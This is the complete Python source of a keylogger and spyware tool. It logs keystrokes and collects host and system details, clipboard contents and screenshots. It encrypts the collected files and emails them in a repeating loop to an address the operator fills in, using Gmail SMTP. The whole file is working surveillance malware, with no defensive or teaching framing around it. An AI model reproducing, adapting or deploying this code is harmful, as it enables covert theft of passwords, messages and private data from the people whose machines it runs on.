import os
import time
import smtplib
import socket
import platform
import pyperclip
import psutil
import threading
from email import encoders
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

# Define the path for storing logs
path = "/path/to/store/logs"
files = {
    "log": os.path.join(path, "log.txt"),
    "system": os.path.join(path, "system.txt"),
    "clipboard": os.path.join(path, "clipboard.txt"),
    "screenshot": os.path.join(path, "screenshot.png")
}

# You can generate a hash key using "generate-hash-key.py" file
# Replace with your generated hash key
hash_key = " "

# Email configurations
from_email = " "
password = " "
to_email = " "


# Function to send email with attachments
def send_email(attachments):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Log-" + str(time.time())

    for file in attachments.values():
        attachment = MIMEBase('application', 'octet-stream')
        try:
            with open(file, 'rb') as f:
                attachment.set_payload(f.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename={file}')
            msg.attach(attachment)
        except Exception as e:
            print(f"Couldn't Attach File {file}... Error: {e}")

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()


# Function to gather and write system information to file
def computer_info():
    with open(files["system"], "w") as f:
        hostname = socket.gethostname()
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + socket.gethostbyname(hostname) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Processor Info: " + platform.processor() + '\n')
        f.write("Machine Info: " + platform.machine() + '\n')
        f.write("CPU Usage: " + str(psutil.cpu_percent(interval=1)) + '\n')
        f.write(f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB\n")
        f.write(f"Available Memory: {psutil.virtual_memory().available / (1024 ** 3):.2f} GB\n")
        f.write(f"Used Memory: {psutil.virtual_memory().used / (1024 ** 3):.2f} GB\n")
        f.write("Memory Usage: " + str(psutil.virtual_memory().percent) + '%\n')


# Function to capture and write clipboard contents to file
def copy_clipboard():
    with open(files["clipboard"], "w") as f:
        try:
            clipboard_data = pyperclip.paste()
            f.write("Clipboard Data: \n" + clipboard_data + '\n')
        except Exception as e:
            f.write("Failed to Get Clipboard Data: " + str(e))


# Function to take a screenshot and save it to file
def screenshot():
    img = ImageGrab.grab()
    img.save(files["screenshot"])


# Function to encrypt files using Fernet encryption
def encrypt_files(files, key):
    for file in files.values():
        try:
            with open(file, "rb") as f:
                data = f.read()
            fernet = Fernet(key)
            with open(file, "wb") as f:
                f.write(fernet.encrypt(data))
        except Exception as e:
            f.write("Failed to Encrypt File: " + str(e))


# Function to handle key press events
def on_press(key):
    global keys, count, current_time
    keys.append(key)
    count += 1
    if count >= 20:
        write_file(keys)
        count = 0
        keys.clear()
        current_time = time.time()


# Function to write logged keys to file
def write_file(keys):
    with open(files["log"], "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write(' ')
            elif "Key" not in k:
                f.write(k)


# Function to handle key release events
def on_release(key):
    return True


# Function to stop the listener after a timeout
def timeout_handler(listener):
    if listener.is_alive():
        listener.stop()


def main():
    global keys, count, current_time, stopping_time
    keys = []
    count = 0

    while True:
        with open(files["log"], "w"):
            pass
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()

        # Timer to stop the keylogger after 30 seconds
        timer = threading.Timer(30.0, timeout_handler, args=[listener])
        timer.start()

        listener.join()

        computer_info()
        copy_clipboard()
        screenshot()
        encrypt_files(files, hash_key)
        send_email(files)

        # Pause the script for 60 seconds before the next iteration
        time.sleep(60)


if __name__ == "__main__":
    main()
